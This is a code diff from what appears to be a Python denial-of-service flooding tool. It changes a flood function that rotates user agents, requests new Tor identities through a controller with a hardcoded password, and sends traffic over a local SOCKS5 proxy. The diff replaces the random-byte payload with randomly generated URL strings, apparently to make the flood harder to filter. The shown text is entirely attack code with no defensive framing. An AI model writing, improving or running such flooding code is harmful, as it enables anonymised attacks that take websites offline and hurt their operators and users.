@@ -12,6 +12,11 @@ for _ in range(30):
     user_agents.append(randomData.random_useragent())
 
 # Headers
+strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
+Intn = random.randint
+Choice = random.choice
+def randomurl():
+	 return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
 
 
 
@@ -30,7 +35,8 @@ def flood(target,domainname,attack,sock):
         controller.authenticate(password="taisaoem")
         controller.signal(Signal.NEWNYM)
 	
-    payload = str(random._urandom(random.randint(10, 500)))
+    #payload = str(random._urandom(random.randint(10, 500)))
+    payload = randomurl()
     if sock =='http':
         proxies = {'http': "socks5://127.0.0.1:9050"}
     elif sock =='https':
